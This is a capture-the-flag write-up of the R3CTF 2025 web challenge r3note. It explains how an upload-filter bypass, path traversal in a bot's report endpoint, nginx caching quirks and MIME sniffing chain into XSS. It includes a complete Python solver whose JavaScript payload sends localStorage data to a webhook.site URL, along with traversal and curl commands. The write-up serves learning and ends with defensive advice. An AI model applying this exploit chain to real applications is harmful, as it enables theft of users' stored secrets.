---
title: "Web - r3note - R3CTF 2025"
date: "2025-07-20"
excerpt: "Writeup of the web challenge r3note from R3CTF 2025"
tags: ["web"]
author: "VXXDXX"
---

## Overview

> In the dawning age of the ARPANET's gleam  
> A simple idea, a persistent dream  
> From a humble note, in '69 it came  
> Steve Crocker wrote it, and whispered its name  
> A "Request for Comments," a title so grand  
> To build the foundation across the land  
> From a simple memo, a legacy grew  
> To connect the world, for me and for you.  

Solves: 10

This write-up describes a series of vulnerabilities in the r3note application that, when chained together, lead to XSS. The vulnerabilities include a file upload bypass, a path traversal, nginx misconfiguration and an XSS vulnerability.

---

## Vulnerability and Source Code Analysis

### 1. File Upload Bypass via appending a fragment

The file upload functionality in `app/api/image.go` attempts to prevent the upload of potentially dangerous files like `.js`, `.css`, and `.html` files. However, this check is based on a simple blacklist of file extensions.

```go
// app/api/image.go:43
ext := filepath.Ext(header.Filename)
if ext == "" || ext == ".js" || ext == ".css" || ext == ".html" {
    c.JSON(http.StatusBadRequest, ErrorResponse{Error: "Invalid file type"})
    return
}
```

This blacklist can be bypassed by using a filename that ends with a fragment, such as `.js#`. The `filepath.Ext` function will return `.js#`, which is not in the blacklist. However, when the file is cached by nginx, the fragment is ignored, and the browser interprets the file as a JavaScript file. This is further explained in the Nginx Configuration section.

### 2. Path Traversal in report functionality

The report functionality allows us to submit a share token, that will be checked out by the bot. There's no sanitization for the submitted token.

```js
// bot/bot.mjs:97
app.post("/api/share/report", (req, res) => {
  const token = req.body.token;
  if (token && typeof token === "string") {
    addTokenToQueue(token);
    res.status(200).json({
      status: "success",
      message: "Report submitted successfully. Thank you for your feedback!"
    });
  } else {
    res.status(400).send("Invalid token");
  }
});
```

```js
// bot/bot.mjs:72
await page.goto("http://127.0.0.1:8080/", { timeout: 5000 });
await page.evaluate((flag) => {
  localStorage.setItem("flag", flag);
}, FLAG);

console.log(`Checking report for token: ${token}`);

await page.goto(`http://127.0.0.1:8080/share/${token}`, { timeout: 5000 });
```

The bot, in `bot/bot.mjs`, navigates to `/share/{token}`, This allows an attacker to craft a malicious token containing path traversal sequences (`../`) to make the bot visit arbitrary endpoints hosted by the server.

### 3. Referer check in GetImage

The `GetImage` which is called by `/api/image/:id` checks for a `Referer` header and returns 403 if it's empty.

```go
func GetImage(c *gin.Context, db *gorm.DB, cfg *config.Config) {
	imgID := c.Param("id")
	var img model.Image
	if err := db.Where("id = ?", imgID).First(&img).Error; err != nil {
		c.JSON(http.StatusNotFound, ErrorResponse{Error: "Image not found"})
		return
	}

	ref := c.Request.Referer()

	if ref == "" {
		c.JSON(http.StatusForbidden, ErrorResponse{Error: "Forbidden"})
		return
	}

	refURL, err := url.Parse(ref)
	if err != nil {
		c.JSON(http.StatusForbidden, ErrorResponse{Error: "Forbidden"})
	}

	fmt.Println(refURL.Host, c.Request.Host)
	if refURL.Host != c.Request.Host {
		c.JSON(http.StatusForbidden, ErrorResponse{Error: "Forbidden"})
		return
	}

	filePath := filepath.Join(cfg.Upload.Path, img.UserID.String(), img.FileName)
	if _, err := os.Stat(filePath); err != nil {
		c.JSON(http.StatusNotFound, ErrorResponse{Error: "File not found"})
		return
	}
	c.File(filePath)
}
```

This prevents us from uploading a malicious html as an image and sending the bot to visit it directly.

### 4. Nginx Configuration

The Nginx configuration plays a crucial role in this exploit. Here's the relevant part of the configuration:

```nginx
location /files/upload/ {
    deny all;
}

location ~ \.(css|js)$ {
    proxy_cache static_cache;
    proxy_pass http://127.0.0.1:3000;
    proxy_cache_key      $uri$is_args$args;
    ...
}
```

Nginx processes location blocks in a specific order of priority. A regular expression match (like `~ \.(css|js)$`) has a higher priority than a prefix match (like `/files/upload/`). This means that even though there's a rule to deny access to the `/files/upload/` directory, a request for a file ending in `.js` within that directory will be handled by the regex location block, bypassing the `deny all` directive. **We'll combine this fact along with the upload bypass trick to send the bot to a malicious html file uploaded by us**. Furthermore, `proxy_cache_key` doesn't include the fragment part, so after we initially access it and therefore cache a file with filename ending with `#whatever` we can later access it omitting the `#whatever` ending.

### 5 Lack of `X-Content-Type-Options: nosniff` response header

Due to the lack of `X-Content-Type-Options: nosniff` in response headers, the browser will guess the MIME type of the file based on its contents.

### 6 Cross-Site Scripting (XSS)

The go middleware sets a CSP that allows us to include scripts served from the same origin.

```go
// app/middleware/jwt.go:66
c.Writer.Header().Set("Content-Security-Policy", "default-src 'self'; script-src 'self'; style-src 'self' 'unsafe-inline';")
```

We can upload arbitrary javascript file via the image upload and include it in our malicious html file.

---

## Exploitation

The exploit consists of the following steps:

1.  **Register**

2.  **Login**

3.  **Get userId via /api/user/me**  
    We need the userId to access our uploaded files via `/files/upload`.  

4.  **Upload a malicious JavaScript file that exfiltrates the flag from localStorage**  
    We upload a JavaScript file that will steal the flag from the bot's local storage and send it to a server we control. We can use any extension that's not blacklisted.

5.  **Upload a malicious HTML file disgused as a js file**  
    We upload an HTML file that will be used to trigger the XSS. This file will contain a `<script>` tag that points to the JavaScript file we uploaded in the previous step. We'll upload the the file with `.js#` extension so that we can access it via the `location ~ \.(css|js)$` nginx rule while bypassing the extension check in code.

6.  **Access the HTML file we have just uploaded to cache it**  
    Caching the file will allow accessing it omitting the fragment (with just `.js`). If we don't perform this step, and try sending the bot to url ending with `.js#`, the browser will ignore the trailing fragment when making the request.

7.  **Trigger the path traversal.**  
    We send a request to the bot's reporting endpoint with a specially crafted token `../files/upload/{user_id}/{html_id}.js`. This token will use path traversal to make the bot navigate to the HTML file we uploaded and cached.

---

## Solver Script

```python
import requests
import random
import string
import subprocess

BASE_URL = "http://127.0.0.1:8080"
API_URL = f"{BASE_URL}/api"
WEBHOOK_URL = "https://webhook.site/482b28b0-6ed4-466d-9855-a211694816e7"

# --- Helper Function ---
def generate_random_string(length):
    """Generates a random alphanumeric string of a given length."""
    return ''.join(random.choices(string.ascii_lowercase + string.digits, k=length))

# --- Main Script ---
def main():
    s = requests.Session()
    username = generate_random_string(6)
    password = generate_random_string(6)
    credentials = {"username": username, "password": password}
    print(f"[*] Generated credentials: {credentials}")

    # --- Step 1: Register User ---
    print("\n[1] Registering user...")
    register_url = f"{API_URL}/user/register"
    r = s.post(register_url, json=credentials, timeout=5)
    r.raise_for_status()  # Raise an exception for bad status codes (4xx or 5xx)
    print(f"[+] Registration successful!")

    # --- Step 2: Login and get Token ---
    print("\n[2] Logging in...")
    login_url = f"{API_URL}/user/login"
    r = s.post(login_url, json=credentials, timeout=5)
    r.raise_for_status()
    login_data = r.json()
    token = login_data.get("token")
    if not token:
        raise ValueError("[!] Failed to get token from login response.")
    print(f"[+] Login successful! Token received.")

    # Add Authorization header for all subsequent requests in this session
    s.headers.update({"Authorization": f"Bearer {token}"})

    # --- Step 3: Get User Info and save userId ---
    print("\n[3] Fetching user info...")
    me_url = f"{API_URL}/user/me"
    r = s.get(me_url, timeout=5)
    r.raise_for_status()
    user_data = r.json()
    user_id = user_data.get("id")
    if not user_id:
        raise ValueError("[!] Failed to get user ID from /me endpoint.")
    print(f"[+] User ID retrieved: {user_id}")

    # --- Step 4: Upload JS payload file ---
    print("\n[4] Uploading JS payload file...")
    js_payload_content = f"window.location='{WEBHOOK_URL}?c='+localStorage.getItem(\"flag\")"
    files_js = {'file': ('.anything', js_payload_content, 'text/html')}
        
    upload_url = f"{API_URL}/image/upload"
    r = s.post(upload_url, files=files_js, timeout=5)
    r.raise_for_status()
    upload_js_data = r.json()
    js_id = upload_js_data.get("id")
    if not js_id:
        raise ValueError("[!] Failed to get ID for the JS payload file.")
    print(f"[+] JS payload uploaded successfully. ID: {js_id}")

    # --- Step 5: Upload HTML file ---
    print("\n[5] Uploading HTML file...")
    html_content = f"<html><body>asdf<script src=/api/image/{js_id}></script></body></html>"
    files_html = {'file': ('.js#', html_content, 'text/html')}
    r = s.post(upload_url, files=files_html, timeout=5)
    r.raise_for_status()
    upload_html_data = r.json()
    html_id = upload_html_data.get("id")
    if not html_id:
        raise ValueError("[!] Failed to get ID for the HTML wrapper file.")
    print(f"[+] HTML wrapper uploaded successfully. ID: {html_id}")

   # --- Step 6: Acecess and cache the uploaded html file. We use curl with --request-target to force the inclusion of "#" in the url.
    command = [
        "curl",
        "-v",
        "--request-target",
        f"/files/upload/{user_id}/{html_id}.js#",
        BASE_URL
    ]
    result = subprocess.run(
        command,
        capture_output=True,
        text=True,
        check=False
    )
    print(result.stdout)

    # --- Step 7: Report/Share to trigger the chain. We can use just ".js" now, since the file is cached and fragment is ignored in the proxy_cache_key ---
    print("\n[6] Sending report to trigger the payload...")
    report_token = f"../files/upload/{user_id}/{html_id}.js"
    report_payload = {"token": report_token, "reason": "asdf"}
        
    report_url = f"{API_URL}/share/report"
    r = s.post(report_url, json=report_payload, timeout=5)
    r.raise_for_status()
    print(f"[+] Report sent successfully! Status: {r.status_code}")
    print(f"    Response: {r.text}")
    print("\n[*] Script finished. Check your webhook URL for results.")

if __name__ == "__main__":
    main()
```

---

## Final Notes

- Remember to include `X-Content-Type-Options: nosniff` in server response headers,
- Pay special attention to nginx configuration.


XOXO,

VXXDXX